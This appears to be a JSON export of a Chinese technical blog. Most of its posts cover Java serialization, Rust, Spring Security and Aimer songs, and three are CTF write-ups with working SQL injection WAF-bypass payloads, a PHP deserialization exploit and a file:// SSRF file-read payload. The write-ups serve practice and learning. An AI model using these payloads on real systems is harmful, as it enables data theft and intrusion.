{"meta":{"title":"Log Horizon","subtitle":"","description":"","author":"gotz9","url":"https://xh-gotz9.github.io","root":"/"},"pages":[],"posts":[{"title":"关于 binary 序列化","slug":"about-java-binary-serialize","date":"2020-12-29T04:42:16.000Z","updated":"2021-05-05T03:35:19.948Z","comments":true,"path":"about-java-binary-serialize/","link":"","permalink":"https://xh-gotz9.github.io/about-java-binary-serialize/","excerpt":"最近用 Java 写了一个简单的 Redis 存取工具, 涉及到了数据的二进制序列化, 记录一下发现的问题和一些思考.","text":"最近用 Java 写了一个简单的 Redis 存取工具, 涉及到了数据的二进制序列化, 记录一下发现的问题和一些思考. 序列化不重要, 反序列化才是关键一开始直接写的序列化部分, 觉得很简单. 想着直接将对象按基础数据类型满满地填进去就完事, 最多就在一些非固定长度数据的前面加个长度字段. 但是到反序列化, 就会出现很多问题. 首先是类型的问题, 数据写得非常紧凑, 但是里面没有类型信息, 反序列化时无法准确获取类型. 其次不具有泛用性, 每个类型的序列化都要单独实现序列化方法. 并且在使用时还要考虑到外部的错误调用等情况, 序列化方法的实现会写得畏手畏脚. 为了泛用性, 考虑使用反射. 反射很方便, 可以获取每个 field. 若提供定制注解, 根据 field 上注解的配置可以定制其序列化行为. 反射序列化通常只需将基础类型, 集合, 数组, 字符串做相应的处理即可, 其他对象最终皆可拆分为基础类型的组合. 当然, 若要严谨, 要还有别的要做. 例如注解类型以及其他一些特殊类型的处理. 当然如果仅仅将反射获得的基本数据按格式排列, 还是会缺少类型信息. 此处参考了 Kryo 框架, Kryo 使用了一个前缀标识字段, 大概结构是 &lt;id&gt; [+ &lt;class name&gt;]. id 对应了 Kryo 对象中存储的 id =&gt; class 映射的 id, 它将 Java 的一些基本类型, 常用类型都默认添加到了这个映射中. 如果需要序列化的类型不在其映射中, 那么会采用备用的 NAME 方案, 即直接将类名写入输出数据中. 反序列化时可以通过 Class.forName 获取相应的 class. 扯点题外话, 用 class 名信息来做反序列化可能会被攻击… 兼容性 兼容性, 万金油的办法是版本号管理, 通过版本号匹配对应的序列化方法. 但是每次改动, 代码量可见地涨, 开发效率低且不易管理, 一旦改动频繁, 更加难受. 此处主要考虑反射序列化的兼容. 因为反射序列化依赖固定的类的结构, 倘若结构变化, 显然 (大部分情况下) 无法反序列化成功. 当对象数据被序列化存储后, 其类结构发生变化. 如果编码中注意到这点, 可以做一些数据缺失的兼容处理, 但没办法解决类型变化带来的麻烦. 首先, 结构变化有两种情况: 顺序变化, 命名变化, 类型变化. 顺序变化, 指声明顺序变化. 如果声明顺序变化, 会影响到反射代码取 Field 结果的排序, 这也会导致数据写入和读取时的顺序. 毕竟就算用 Field.name 排序, 也会存在插队现象. 做成 map 映射是个人看来比较好的选择, 那拿什么做成 map 映射就是关键了. 通常会考虑用 Field.name 做 map 的 key, 首先不重复, 其次便于查找. 可以参考 JSON 序列化, JSON 序列化其实就是将 object 当作 map. 其内的 key 与 Java 类的 Field 一一对应, 值也一一对应. 命名变化, 应对的办法也比较简单, 在上一步的基础上将 key 映射到 Field 的某个不易变的属性上, 不去依赖代码中易变的 Field.name 即可. 可以想到的方式是为 Filed 添加注解, 在注解中为 Field 写入序列化映射 key 的元信息. 这样一来, 因为 Field.name 变动导致的反序列化失败就会少很多了. 最后的问题是类型变化. 这个基本无解. 如果要做原类型转换, 又要新增代码逻辑, 随着版本迭代, 一坨又一坨, 要兼容的老版本越多, 代码越多, 全都还不好复用, 地狱啊. 参考一下 protobuf 的设计, protobuf 的定义中会为协议结构体指定一个值, 例如: 12345message SearchRequest &#123; string query = 1; int32 page_number = 2; int32 result_per_page = 3;&#125; 其实这与上面命名变化所想大致无差别, 前面只是个名字, 真正作为 field key 的是后面的数字. 协议升级, 只能在后面添加新的 field key, 而不会改变前面的部分, 以保持与不同版本代码的协议兼容性. 所以若要做成类似 protobuf 的形式, 需要通过注解指定一个不重复的 field key. 使用 protobuf 要在 Java 中引入新的协议代码, 原有的数据对象需要进行转换才可序列化. 要是利用反射序列化来做, 也许有一定用处. 最终用法大概如下: 1234567891011// version 1class Foo &#123; @SerializeField(id = 1) int bar;&#125;// version 2class Foo &#123; @SerializeField(id = 2) String bar;&#125;","categories":[{"name":"开发","slug":"开发","permalink":"https://xh-gotz9.github.io/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://xh-gotz9.github.io/tags/Java/"},{"name":"序列化","slug":"序列化","permalink":"https://xh-gotz9.github.io/tags/%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"protobuf","slug":"protobuf","permalink":"https://xh-gotz9.github.io/tags/protobuf/"},{"name":"Kryo","slug":"Kryo","permalink":"https://xh-gotz9.github.io/tags/Kryo/"}]},{"title":"Rust - 智能指针","slug":"rust-smart-pointers","date":"2020-12-12T18:36:47.000Z","updated":"2021-05-05T03:35:19.948Z","comments":true,"path":"rust-smart-pointers/","link":"","permalink":"https://xh-gotz9.github.io/rust-smart-pointers/","excerpt":"Rust 智能指针的用法总结 v0.1.","text":"Rust 智能指针的用法总结 v0.1. 引用计数 - RcRc 是引用计数指针, 如果需要在别处长期保留引用, 需要为指针添加计数. 此时应该调用 Rc::clone 来为指针添加计数, 而不是直接保留 Rc 对象或其引用. 12let rc = Rc::new(5);let new_rc = Rc::clone(&amp;rc); 弱引用Rc::clone 会创建一个强引用, 如果多个强引用间有循环引用, 会导致它们无法被计数归零, 因此无法而顺利回收. Rc::downgrade 可以创建一个 Rc&lt;T&gt; 指针的弱引用指针 Weak&lt;T&gt;. 弱引用不会增加强引用计数, 自然也无法影响 数据的回收. 弱引用因为不会阻止引用的数据被清理, 所以要调用 upgrade 尝试获取获取强引用, 来保证数据在自身使用期间不会被清理. 12345678910111213141516let r_out_weak;&#123; let r = Rc::new(1); let r_weak = Rc::downgrade(&amp;r); r_out_weak = Rc::downgrade(&amp;r); assert_eq!(Rc::strong_count(&amp;r), 1); let r_strong = r1.upgrade(); assert_eq!(Rc::strong_count(&amp;r), 2); assert_eq!(r1.upgrade().and_then(|x| Some(x.as_ref().clone())), Some(1));&#125;let r_out_strong = r_out_weak.upgrade();// r_out_weak 引用的 r 数据失效assert_eq!(r_out_strong, None);","categories":[{"name":"开发","slug":"开发","permalink":"https://xh-gotz9.github.io/categories/%E5%BC%80%E5%8F%91/"},{"name":"Rust","slug":"开发/Rust","permalink":"https://xh-gotz9.github.io/categories/%E5%BC%80%E5%8F%91/Rust/"}],"tags":[{"name":"Rust","slug":"Rust","permalink":"https://xh-gotz9.github.io/tags/Rust/"},{"name":"智能指针","slug":"智能指针","permalink":"https://xh-gotz9.github.io/tags/%E6%99%BA%E8%83%BD%E6%8C%87%E9%92%88/"}]},{"title":"Spring Security 框架概览","slug":"Spring-Security-框架概览","date":"2020-08-06T15:26:19.000Z","updated":"2021-05-05T03:35:19.948Z","comments":true,"path":"Spring-Security-框架概览/","link":"","permalink":"https://xh-gotz9.github.io/Spring-Security-%E6%A1%86%E6%9E%B6%E6%A6%82%E8%A7%88/","excerpt":"Spring Security 框架的一点笔记. 参考文档: 官方文档","text":"Spring Security 框架的一点笔记. 参考文档: 官方文档 认证和访问控制应用安全总结起来可以大概归为两个独立的问题: 认证 (你是谁), 授权 (你有权做什么). 通常授权也被称作 访问控制, 这样可能更容易让人理解一些. Spring Security 就是用于分离 认证 和 授权, 并且提供了一些现成的策略实现和功能扩展点的框架. 认证认证功能主要接口是 AuthenticationManager: 123456public interface AuthenticationManager &#123; Authentication authenticate(Authentication authentication) throws AuthenticationException;&#125; 用户实现 AuthenticationManager 应该符合文档的要求: 返回一个包含授权信息的 Authentication 实例, 或者抛出一个 AuthenticationException 或其子类型的运行时异常. AuthenticationManager 常用的实现是 ProviderManager, 它代表一组 AuthenticationProvider. AuthenticationProvider 接口的功能与 AuthenticationManager 相似, 但提供了 support 方法, 用于检查 AuthenticationProvider 是否支持对特定的 Authentication 实现进行认证. 12345678public interface AuthenticationProvider &#123; Authentication authenticate(Authentication authentication) throws AuthenticationException; boolean supports(Class&lt;?&gt; authentication);&#125; 此处的 authenticate 方法与 AuthenticationManager 的有些不同, 如果提供的 Authentication 对象是不支持的实现, 则应该返回 null. ProviderManager 可以设置一个父节点, 用以在自己的 provider 无法进行认证时委托认证. 将某个 ProviderManager 作为所有 ProviderManager 的父节点, 那么它就可以看作是一个全局 manager. 自定义认证管理用户可以通过 Spring 提供的 AuthenticationManagerBuilder 来快速创建自己的 AuthenticationManager. 如果使用 @Autowired 注解, 获取到的 AuthenticationManagerBuilder 是可以创建全局的 manager, 而如果使用 WebSecurityConfigurerAdapter 之类的配置类, 它提供的 builder 会创建 “局部” 的 manager (全局 manager 的子节点). 在 Spring Boot 中, 通过 @Autowired 可以将全局 manager 注入其他 bean. 如果要注入 “局部” manager, 则需要显式指定. Spring Boot 提供了默认的全局 AuthenticationManager, 可以通过抢先提供自己定义的 AuthenticationManager bean 来覆盖它. 授权或访问控制当认证成功, 接着就可以进行授权了, 授权的核心策略接口是 AccessDecisionManager. Spring Security 提供了三种默认实现: AffirmativeBased (乐观, 有任意 voter 同意即可认同授权), ConsensusBased (达成共识, 根据 voter 的处理得出结果, 少数服从多数), UnanimousBased (一致, 需要全部 voter 同意授权). 它们都会委托一组 AccessDecisionVoter 进行决策. 一个 AccessDecisionVoter 会根据提供的认证凭据 Authentication, 受保护对象 object, 还有受保护对象相关的 ConfigAttribute 来决策是否允许用户访问. ConfigAttribute 用来表示访问 object 所需要的的权限. ConfigAttribute 仅有一个方法 getAttribute, 返回一个字符串, 字符串有较高的通用性, 可以搭配一些表达式规则让它能表示一些复杂数据 (例如 JSON ?). 在 Spring Security 提供的实现 RoleVoter 就是将 ConfigAttribute 中的数据作为允许访问 object 的角色名, 通过 supports 方法检查是否支持将 attribute 作为决策依据, 然后检查认证信息, 确认该用户是否满足条件. 123456789101112public interface AccessDecisionVoter&lt;S&gt; &#123; int ACCESS_GRANTED = 1; int ACCESS_ABSTAIN = 0; int ACCESS_DENIED = -1; boolean supports(ConfigAttribute attribute); boolean supports(Class&lt;?&gt; clazz); int vote(Authentication authentication, S object, Collection&lt;ConfigAttribute&gt; attributes);&#125; 大部分人都只使用了默认的 manager 实现 AffirmativeBased. 自定义策略都倾向于修改 voter, 要么添加一个新 voter, 要么在原有的 voter 上做修改. Spring Security 流程AbstractSecurityInterceptor 实现了 Spring Bean 的相关接口, 确保安全拦截器能正确地启动. 定义了正确的 Spring Security 认证/授权的流程框架: 从 SecurityContextHolder 获取 Authentication. 通过从 SecurityMetadataSource 查询受保护对象, 确认请求是公共调用或是受保护调用. 针对受保护调用 (可以从 SecurityMetadataSource 获取到一组 ConfigAttribute): 如果 Authentication.isAuthenticated() 返回 false, 或者 alwaysReauthenticate 是 true, 那么使用配置的 AuthenticationManager 对请求进行认证. 认证完成后, 用返回值替换 SecurityContextHolder 中的 Authentication. 通过配置的 AccessDecisionManager 对访问进行授权. 用 RunAsManager 对 run-as 请求进行替换. 将控制权交给具体的子类, 由子类执行对受保护对象的访问. 在调用 beforeInvocation 之后会返回一个 InterceptorStatusToken, 在子类结束调用后需要确保回调 finallyInvocation 整理拦截器的环境. 具体子类回调 afterInvocation 方法. 如果 RunAsManager 替换了 Authentication 对象, 将原对象退回 SecurityContextHolder. 如果配置了 AfterInvocationManager, 调用该 manager. 它可以替换受保护调用返回的对象 (可以用于过滤数据). 对于一个公共调用 (从 SecurityMetadataSource 获取不到 attribute): 同上对受保护调用的操作, 具体子类将按执行访问操作, 在适当的位置回调 AbstractSecurityInterceptor 的函数. 并且, 在 afterInvocation 中将不进行任何操作直接返回. 控制权再次回到具体子类, 由子类将调用结果返还给真正的调用方, 或者抛出异常. AbstractSecurityInterceptor 子类的实例代码: 12345678910111213// MethodSecurityInterceptor.javapublic Object invoke(MethodInvocation mi) throws Throwable &#123; InterceptorStatusToken token = super.beforeInvocation(mi); Object result; try &#123; result = mi.proceed(); &#125; finally &#123; super.finallyInvocation(token); &#125; return super.afterInvocation(token, result);&#125; 代码出自 Spring Security 的方法拦截器.","categories":[{"name":"开发","slug":"开发","permalink":"https://xh-gotz9.github.io/categories/%E5%BC%80%E5%8F%91/"},{"name":"Java","slug":"开发/Java","permalink":"https://xh-gotz9.github.io/categories/%E5%BC%80%E5%8F%91/Java/"}],"tags":[{"name":"Spring","slug":"Spring","permalink":"https://xh-gotz9.github.io/tags/Spring/"},{"name":"Spring Security","slug":"Spring-Security","permalink":"https://xh-gotz9.github.io/tags/Spring-Security/"}]},{"title":"blanc & noir","slug":"blanc-and-noir","date":"2020-07-03T06:45:30.000Z","updated":"2021-05-05T03:35:19.948Z","comments":true,"path":"blanc-and-noir/","link":"","permalink":"https://xh-gotz9.github.io/blanc-and-noir/","excerpt":"以前整理的 Aimer 推特上发布的关于 blanc 和 noir 两张精选专辑入选歌曲的感想. 因为 Aimer 的歌大都是她本人以 Aimerrhythm 的名义作词, 这不仅是歌手的角度, 也是作词的角度的感想.","text":"以前整理的 Aimer 推特上发布的关于 blanc 和 noir 两张精选专辑入选歌曲的感想. 因为 Aimer 的歌大都是她本人以 Aimerrhythm 的名义作词, 这不仅是歌手的角度, 也是作词的角度的感想. blanc六等星の夜12345678910「blanc」収録1 六等星の夜六等星は肉眼で見えるいちばん暗い星だから「六等星の夜」はだれかの人生そのものだと思いながら、詞を書きました。ベストの1曲めはこの曲にしたかったのです。たくさんの想いと思い出が詰まったはじまりの曲です。 蝶々結び12345678910「blanc」収録2 蝶々結び夜明けの先に出会った 大切な曲。出来上がったMVを初めてみたときあんまりにも素敵だったから、嬉しさと苦しさがないまぜになって大泣きしたのを忘れられません。 あなたに出会わなければ～夏雪冬花～12345「blanc」収録3 あなたに出会わなければ～夏雪冬花～“出会えた”喜び、“出会ってしまった”悲しみ、どちらも肯定した曲です。「夏雪冬花」は、奇跡のような出会いという意味をこめてつけました。 ポラリス12345678「blanc」収録4 ポラリスみんなが旅人。戻ることはできない道、前へ進めば傷つくこともある。こころの奥に不安も孤独も、必ずある、一人ぼっちの旅。そんな道だからこそ誰かが誰かのポラリスになれたらいいのにって書いた曲。 Re:pray12345678910「blanc」収録5 Re:pray避けて通れない別れ、それでも&quot;届けたいあしたへの&quot;祈り。MVが印象的と言っていただくことも多い曲です。個人的には真夜中の海に浸かってのジャケット撮影が、極寒だったのも印象的.. 星屑ビーナス12345678910「blanc」収録6 星屑ビーナス大切な人に見せる最後の顔は泣き顔じゃなく笑顔でありたい悲しくてそれでも歩いてゆこうとする気持ち。別れの曲です。 broKen NIGHT1234567891011「blanc」収録7 broKen NIGHT今までの曲の中でもいちばん「物語」の色濃いバラードです。美しくて儚くて現実からどこまでも離れた&quot;だれかの&quot;世界を書き歌いました。 カタオモイ1234567891011「blanc」収録8 カタオモイいまではライブに欠かせない曲です。&quot;カタオモイ&quot;あなたにとって悲しい響き?嬉しい響き?こんな曲に似合うような声を持っていること、誇らしく思うようなそんな曲です。 君を待つ12345678910「blanc」収録9 君を待つメロディの冷たい印象を季節につなげました。寒い冬に佇んで遠い春のような&quot;君&quot;をもう会えない&quot;君&quot;を、思い待ち続ける気持ちを詞に書きました。 茜さす12345678910「blanc」収録10 茜さす「daydream」リリース後の自分の心境とシンクロさせながら詞を書きました。痛み重ね 出会いを知る出会い重ね 願いを知るずっと歌いたいという思いも込めた曲です。 雪の降る街123456789101112「blanc」収録11 雪の降る街透き通った冬は大好き。でもひとりではかじかむ手のひらに寂しくもなる季節。気持ちを素直に表現しました。わたしの最初の“冬の曲”です。アートワークは自慢したくなるほどに可愛い! everlasting snow12345678910「blanc」収録12 everlasting snowきのう紹介した「雪の降る街」から4年以上経って、去年リリースしたのがこの曲です。寒い冬に、暖かいものを感じてほしいと思って詞を書いたのはこの曲が初めて。 March of Time123456789「blanc」収録13 March of Timeタイトルは&quot;時の経過&quot;離れても心の中輝き続ける誰かの 何かの 光は、きっと背中を押してくれる。春、今も新しい一歩を踏み出しているあなたにこの曲が寄り添えたらいいな。 歌鳥風月1234567891011「blanc」収録14 歌鳥風月曲調 歌詞ともにまたあたらしい挑戦ができた1曲。白盤最後にして、歌声をいちばん裸にされました。いまのわたしの声があなたに届くといいな。素晴らしいMV。わたしは泣いてしまいました。 noirStarRingChild12345678「noir」収録1 StarRingChild“黒盤”を創るきっかけとなった「力強い曲」。わたしにとって、これがその2曲目でした。拙いと今思うところもあるけれど、あのときの精一杯です。未来へ光が希望が見える曲です。 Brave Shine12345678910「noir」収録2 Brave Shine決意を灯した曲。声が出なくなったことがきっかけで出来ました。夜明けのアルバム「DAWN」へ導いてくれた「もっとも暗い夜明け前」の曲。わたしの光にもなってくれました。 insane dream12345678「noir」収録3 insane dream夜明けの先の旅、すべての始まりは、実はこの曲からでした。「daydream」ジャケットを撮ったLA、そこでのレコーディングを思い出していつでも鼓舞される思い入れ深い曲です。 Stars in the rain12345678910「noir」収録4 Stars in the rainこんな雨の夜でも星をかすかな星を見つけることができるかもしれない。僕らなら。そんな奇跡を歌いました。旋律が美しくてとてもエモーショナルな曲です。 眠りの森123456789「noir」収録5 眠りの森誰かにとってたとえ残酷でもずっと走り続けたいと思って歌詞を書きました。1stアルバムリリース後に感じていた気持ちです。これも大好きな1曲なので、ベストに収録できてうれしい。 LAST STARDUST12345678910「noir」収録6 LAST STARDUSTこの曲はわたしにとって「Brave Shine」と&quot;つがい&quot;で、だから間奏ではBrave Shineの一節もちいさく歌いました。弱さとの決別を書きました。歌っていると勝手に感情的になってしまいます。 凍えそうな季節から1234567891011「noir」収録7 凍えそうな季節から悲しいくらいなにかに惹かれる気持ちを鼻で笑う人まだ 恐れている人もう 手放してしまった人。考えながら書きました。 誰か、海を。1234567891011「noir」収録8 誰か、海を。それまでも夜は歌ってきたけれど、ここまで深海に潜るような曲は初めてでした。こんな曲なのに、こんな曲だからこそ激しくなればなるほど微笑んで歌うのが似合うなって思ってしまうのです。 ninelie12345678910「noir」収録9 ninelie9曲めは9th singleとしてもリリースした&quot;nine&quot;lie。声を重ねることは好きです。Don’t be afraid Daybreak has come.心が篭りました。 holLow wORlD123456789「noir」収録10 holLow wORlD全編英語詞の曲。自分で書いた中で初めての挑戦でした。黒盤に収録するにしかるべき激しい曲です。実はライブでは殆ど歌ったことがないかも…?だからこそ知ってほしいな。 us1234567891011「noir」収録11 usこんな激しさを自分が歌えるなんて。さらなる可能性をこの曲に引き出してもらいました。「誰か、海を。」とはまた違う狂気です。今のところ歌っていてある意味でいちばん&quot;乱される&quot;曲です。 s-AVE123456789101112「noir」収録12 s-AVEこの5年嬉しいことにボーカルとしても数々のプロジェクトに呼んでいただいたなと思います。中でもこれはMVにまでたくさん出演させていただいた曲、あらためて閉じ込めさせて貰いました。 RE:I AM12345678910「noir」収録13 RE:I AMわたしにとって初めての「力強い曲」がこれでした。この曲に導いてもらいました。だからどうしても特別な一曲。タイトルは「Aimer」のアナグラムだからやっぱり、特別な一曲。 zero12345678910111213「noir」収録14 zeroそしてこれが、黒盤最後の一曲。「zero」“リセット”の意味を込めました。また、ここをゼロにして始まりにして、進んでいきたい。&quot;君のリアル刻めたのなら&quot;終わらないのです。","categories":[{"name":"杂文","slug":"杂文","permalink":"https://xh-gotz9.github.io/categories/%E6%9D%82%E6%96%87/"},{"name":"资料整理","slug":"杂文/资料整理","permalink":"https://xh-gotz9.github.io/categories/%E6%9D%82%E6%96%87/%E8%B5%84%E6%96%99%E6%95%B4%E7%90%86/"}],"tags":[{"name":"Music","slug":"Music","permalink":"https://xh-gotz9.github.io/tags/Music/"},{"name":"Aimer","slug":"Aimer","permalink":"https://xh-gotz9.github.io/tags/Aimer/"}]},{"title":"极客大挑战2019 - HardSQL","slug":"极客大挑战2019-HardSQL","date":"2020-06-28T04:42:16.000Z","updated":"2021-05-05T03:35:19.948Z","comments":true,"path":"极客大挑战2019-HardSQL/","link":"","permalink":"https://xh-gotz9.github.io/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-HardSQL/","excerpt":"熬夜是没有好事的, 反应慢, 眼睛疼, 根本做不动题. 审题还好歪打正着, 没走太多弯路. 早上起来, 将就晚上写的 payload 操作一下就过了.","text":"熬夜是没有好事的, 反应慢, 眼睛疼, 根本做不动题. 审题还好歪打正着, 没走太多弯路. 早上起来, 将就晚上写的 payload 操作一下就过了. 审题一个简单的登陆, 先是加单引号出现报错, 在 username 栏加单引号的话, 从报错信息可以看出 password 用的是明文, 可以加以利用. 同时推测 WHERE 条件是 username = &#39;?&#39; and password = &#39;?&#39;. 首先尝试万能密码, 发现被检测了, 也是嘛, 题目也说了爆肝 SQL 注入了, 这肯定有 waf. 测试 WAF被检测的字符: 1&#96; &#96;, &#96;and&#96;, &#96;if&#96;, &#96;union&#96;, &#96;&amp;&#96;, &#96;|&#96; 晚上实在有点困, 眼皮打架, 没心思测 waf, 测了一点常用的之后就直接开搞了. 万能密码登陆没啥好说的直接上 payload 了: 123# 将SQL改写为: username &#x3D; &#39;x&#39;or(not&#39; and password&#x3D;&#39;^&#39;x&#39;)#&#39;?username&#x3D;x&#39;or(not&amp;password&#x3D;^&#39;x&#39;)# 报错注入绕过后没有给 flag, 才想起了报错注入. 正好绕过的时候吧 WHERE 逻辑改写成 OR 组合, 不会被’短路’, 直接接着改了. 12345678910111213SELECT * FROM user WHERE uname &#x3D; a&#39;or(&#39; AND password &#x3D; &#39;^&#39;a&#39;)or(updatexml(&#39;ab&#39;,concat(&#39;~&#39;,(select(group_concat(table_name)from(information_schema.tables)where((table_schema)like(database())))))))#&#39;# H4rDsq1?username&#x3D;a&#39;or(&amp;password&#x3D;^&#39;a&#39;)or(extractvalue(&#39;ab&#39;,concat(&#39;~&#39;,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like(&#39;H4rDsq1&#39;))))))%23# id, username, password?username&#x3D;a&#39;or(&amp;password&#x3D;^&#39;a&#39;)or(extractvalue(&#39;ab&#39;,concat(&#39;~&#39;,(SELECT(GROUP_CONCAT(username))FROM(H4rDsq1)),20)))%23# flag?username&#x3D;a&#39;or(&amp;password&#x3D;^&#39;a&#39;)or(extractvalue(&#39;ab&#39;,concat(&#39;~&#39;,right((SELECT(GROUP_CONCAT(password))FROM(H4rDsq1)),20))))%23 由于报错信息有数据长度限制, 用字符串截取函数即可 (WAF 检测了 substring 函数, 用了 right). payload改良后的 payload 如下, &lt;INJECT&gt; 的 SQL 语句注意绕过 WAF 即可. 12?username&#x3D;a&#39;or(extractvalue(&amp;password&#x3D;,concat(&#39;~&#39;,(&lt;INJECT&gt;))))%23","categories":[{"name":"CTF","slug":"CTF","permalink":"https://xh-gotz9.github.io/categories/CTF/"},{"name":"BUUCTF","slug":"CTF/BUUCTF","permalink":"https://xh-gotz9.github.io/categories/CTF/BUUCTF/"}],"tags":[{"name":"SQLI","slug":"SQLI","permalink":"https://xh-gotz9.github.io/tags/SQLI/"},{"name":"writeup","slug":"writeup","permalink":"https://xh-gotz9.github.io/tags/writeup/"}]},{"title":"网鼎杯2020 青龙组 - AreUSerialz","slug":"网鼎杯2020青龙组-AreUSerialz","date":"2020-06-27T05:22:42.000Z","updated":"2021-05-05T03:35:19.948Z","comments":true,"path":"网鼎杯2020青龙组-AreUSerialz/","link":"","permalink":"https://xh-gotz9.github.io/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz/","excerpt":"题目挺直白, 直接给源码. 从题解来看是要考察 PHP 反序列化中字符串的另一种 format, 网上查了好久都找不到相关描述… 可能这个特性太冷门了没多少人关注吧.","text":"题目挺直白, 直接给源码. 从题解来看是要考察 PHP 反序列化中字符串的另一种 format, 网上查了好久都找不到相关描述… 可能这个特性太冷门了没多少人关注吧. 代码审计代码将提交的 uri 参数 str 传给 is_valid 进行了一次检测, 检测是否可打印字符串 (为什么不算上 &#39;\\x7E&#39; 的 ~). FileHandler 类中的魔术方法 __distruct 在一定条件下可以调用 read 方法来执行 file_get_contents 并输出, 文件参数是反序列化对象的属性, 可控. 源代码上面有一行 include(&quot;flag.php&quot;), 很显然是用这个来读取 flag.php 文件了. 构造 payload: 123456$f = new FileHandler();$f-&gt;op = 2;$f-&gt;filename = &quot;flag.php&quot;;$f-&gt;content = &quot;&quot;;$payload = serialize($f); 绕过检测刚还在想输入检测没用, 马上问题就来了, 类属性都是 protected, 序列化后的属性名前面会带上 &#39;\\0*\\0&#39; 字符串, &#39;\\0&#39; 字符如果用 urlencode 成 %00 传过去会被 decode 然后检测到… 求助老师傅们, 看 wp 提到 PHP 的字面量表示反序列化, 找到了一篇相关文章. 文中补充部分有提到 PHP 将序列化数据中表示字符串类型区分了两种字符串表示方式, 一种是 non-escaped 的字符串, 用 s 表示. 另一种则是使用 S 表示的 escaped 字符串, 可以在数据中以 \\ 开头加上两位的十六进制编码来表示一个字节的数据, 例如 S:2: &quot;\\312&quot;; 会在 PHP 中被反序列化为字符串 12. 由于字面量仅会在反序列化时被转义识别, 在 is_valid 阶段都是可显示字符, 不会被检测, 即可成功绕过. 对上面的 payload 进行处理: 12$payload = str_replace(chr(0), &#x27;\\00&#x27;, $payload);$payload = str_replace(&#x27;s&#x27;, &#x27;S&#x27;, $payload); 参考的 wp 还提到了执行目录的问题, 意思是在执行 __distruct 时执行目录可能不在当前文件的目录中, 要用绝对路径获取, 但我实际操作时是读到了 flag 的. 如果要用绝对路径, 可以尝试让程序输出报错信息, 里面会提示 index.php 文件的绝对路径, 即可知道 flag.php 的绝对路径了. tips. 没有用 highlight_file 之类的源代码输出函数, 直接输出 PHP 源代码的话, 因为 &lt;?php 代码块的原因, 多半是不会直接在屏幕上看到结果的, 注意看 response 数据或者网页源代码. 参考链接PHP 序列化（serialize）格式详解writeup","categories":[{"name":"CTF","slug":"CTF","permalink":"https://xh-gotz9.github.io/categories/CTF/"},{"name":"BUUCTF","slug":"CTF/BUUCTF","permalink":"https://xh-gotz9.github.io/categories/CTF/BUUCTF/"}],"tags":[{"name":"writeup","slug":"writeup","permalink":"https://xh-gotz9.github.io/tags/writeup/"},{"name":"PHP","slug":"PHP","permalink":"https://xh-gotz9.github.io/tags/PHP/"},{"name":"Unserialize","slug":"Unserialize","permalink":"https://xh-gotz9.github.io/tags/Unserialize/"}]},{"title":"网鼎杯2018 - Fakebook","slug":"网鼎杯2018-Fakebook","date":"2020-06-25T18:08:20.000Z","updated":"2021-05-05T03:35:19.948Z","comments":true,"path":"网鼎杯2018-Fakebook/","link":"","permalink":"https://xh-gotz9.github.io/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/","excerpt":"网鼎杯2018的题, 还算简单, 可惜自己不带脑子. 离熟练解题还有很长的距离, 感觉主要是没有给自己定一个的测试流程, 经常想到哪做到哪, 脑子一短路就卡壳.","text":"网鼎杯2018的题, 还算简单, 可惜自己不带脑子. 离熟练解题还有很长的距离, 感觉主要是没有给自己定一个的测试流程, 经常想到哪做到哪, 脑子一短路就卡壳. 发现 SQL 注入登陆/注册页面简单看了下, 应该不是拿admin, 正常注册使用. 从登陆后首页跳转到 /view.php?no=1. payload ?no=0, 页面出现报错. 进一步尝试注入扫库, 成功, 仅 union select 貌似被检测了, 用 /**/ 代替空格绕过.库中仅有 users 表, 字段: no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS, 数据仅有刚注册的用户, 没有其他信息. 看来不是单纯脱裤能解决的. 查看 data 字段, 是 PHP 的序列化数据, 可以解释访问 ?no=0 时开头出现的调用 unserialize 反序列化报错, 以及显示位置出现调用方法报错的原因. data列的数据: 1O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;a22&quot;;s:3:&quot;age&quot;;i:11;s:4:&quot;blog&quot;;s:9:&quot;baidu.com&quot;;&#125; 目录扫描 &amp; 代码审计到这里看到可能是要利用反序列化, 但是有点没头绪, 查了 writeup 找提示, 发现提到扫目录, 想起了网站常用的 robots.txt 文件, 访问成功, 而且记录了一个路径 /user.php.bak. 打开, 是 PHP 源码, 进行代码审计. 代码是数据库序列化存储的 UserInfo 类的定义文件, isValidBlog 会对注册提交的连接进行检测, 根据 PHP 报错信息, getBlogContents 会在 view.php 中调用, 它会调用 get 方法利用 curl_exec 函数获取 blog 属性指定的 url 的内容. curl_exec 漏洞对 PHP 的 curl 功能一无所知… 接下来就是学习时间了 首先是查到 curl_exec 任意文件读取, 利用 file:// 协议头可以忽略 host 部分, 直接读取 uri 部分指定的文件. 例如 file://192.168.0.11/etc/passwd, 会直接读取 /etc/passwd 文件. 进行尝试, 假定 isValidBlog 仅会在注入时调用, 从 view.php 的 SQL 注入点注入一个序列化的 UserInfo 对象则可以绕过. 用之前序列化数据检测回显列, 发现序列化数据在第4列. 构建 payload: 1?no&#x3D;2 AND 0 UNION&#x2F;**&#x2F;SELECT 1,group_concat(data),3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;a22&quot;;s:3:&quot;age&quot;;i:11;s:4:&quot;blog&quot;;s:12:&quot;file:&#x2F;&#x2F;&#x2F;flag&quot;;&#125;&#39; FROM users-- - emmm 读不到数据, 测试读取 /var/www/html/view.php.bak 是成功了的… 尴尬了, 测了 /flag, /tmp/flag, ./flag, 都没有. 查 writeup 看看师傅们怎么做的吧… 得, 都是扫出来的, flag 文件是 网站目录下的 flag.php, 即 /var/www/html/flag.php, 以此构建 payload: 1?no&#x3D;2 AND 0 UNION&#x2F;**&#x2F;SELECT 